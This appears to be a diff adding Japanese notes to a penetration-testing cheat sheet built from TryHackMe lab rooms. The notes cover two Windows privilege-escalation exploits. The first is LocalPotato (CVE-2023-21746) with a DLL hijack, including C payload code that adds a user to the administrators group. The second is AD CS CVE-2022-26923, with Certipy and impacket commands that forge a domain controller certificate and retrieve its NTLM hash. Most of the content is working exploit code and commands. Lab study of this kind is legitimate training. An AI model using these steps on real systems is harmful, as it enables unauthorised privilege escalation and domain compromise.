@@ -216,3 +216,127 @@ curl -v http://10.10.120.177/api/index.php/v1/config/application?public=true
 # ユーザー
 curl -v http://10.10.120.177/api/index.php/v1/users?public=true
 ```
+
+## CVE-2023-21746 (LocalPotato)
+
+https://tryhackme.com/room/localpotato
+
+https://github.com/decoder-it/LocalPotato
+
+- 2023 年 1 月の月例パッチで修正済
+- ターゲットマシンに任意のファイルを書き込むことが出来る脆弱性。
+- [DLL ハイジャック（LPE via StorSvc）](https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc)と組み合わせることで、権限昇格を実現する。
+
+`SprintCSP.dll` `RpcClient.exe` のコンパイルが必要。
+
+### 準備
+
+#### RpcClient.exe
+
+storsvc_c.c
+
+```c
+#define WIN10
+//#define WIN11
+//#define WIN2019
+//#define WIN2022
+```
+
+#### SprintCSP.dll
+
+main.c
+
+例：現在のユーザーを管理者グループに追加する。
+
+```c
+void DoStuff() {
+
+    // Replace all this code by your payload
+    STARTUPINFO si = { sizeof(STARTUPINFO) };
+    PROCESS_INFORMATION pi;
+    CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net localgroup administrators user /add",
+        NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);
+
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    return;
+}
+```
+
+### エクスプロイト
+
+```ps
+# PATHの確認
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -v Path
+
+# いずれかのPATHにコピーする必要があるが、権限不足でエラーになるので
+copy SprintCSP.dll C:\Windows\System32\SprintCSP.dll
+
+# LocalPotato を使ってコピーする
+LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll
+
+# RPCをトリガー
+RpcClient.exe
+
+# 確認
+net user user
+```
+
+## CVE-2022-26923 (ActiveDirectory 証明書サービス (CS))
+
+https://tryhackme.com/room/cve202226923
+
+- 構成ミスのある証明書テンプレートを悪用することで、権限昇格やラテラルムーブメント（横方向の攻撃）が可能
+- `Validate write to DNS hostname`, `Validate write to Service Principal Name (SPN)` の 2 つの権限が付与されている場合に脆弱性がある。
+
+### ステップ
+
+1. 権限の低い AD ユーザーの資格情報を侵害します。
+2. これらの資格情報を使用して、ドメインに新しいホストを登録します。
+3. コンピュータ AD オブジェクトの DNS ホスト名属性を、ドメイン コントローラなどの特権ホストの属性に変更します。
+4. 固有の SPN 競合の問題を回避するために、SPN 属性を削除します。
+5. デフォルトのテンプレートを使用してマシン証明書を要求します。
+6. 受信したテンプレートを使用して、偽のマシン アカウントではなく特権マシン アカウントとして Kerberos 認証を実行します。
+
+### エクスプロイト
+
+/etc/hosts（kali）
+
+```sh
+10.10.254.197 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca.com
+```
+
+https://github.com/ly4k/Certipy
+
+```sh
+# 権限の低いADユーザーの証明書
+certipy req 'lunar.eruca.com/thm:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template User
+
+# 証明書確認
+certipy auth -pfx thm.pfx
+
+# ドメインにコンピュータを追加（impacket）
+addcomputer.py 'lunar.eruca.com/thm:Password1@' -method LDAPS -computer-name 'THMPC' -computer-pass 'Password1@'
+
+# コンピュータの証明書
+certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine
+
+# 確認
+certipy auth -pfx thmpc.pfx
+```
+
+```ps
+# SPNを削除してからDNSホスト名をDCに変更
+#（先にSPNを削除しないと、ホスト名変更によりSPNが自動変更され、SPN重複により変更失敗する）
+Set-ADComputer THMPC -ServicePrincipalName @{}
+Set-ADComputer THMPC -DnsHostName LUNDC.lunar.eruca.com
+```
+
+```sh
+# 証明書偽造
+certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine
+
+# DC のNTLMハッシュが返る
+certipy auth -pfx lundc.pfx
+```
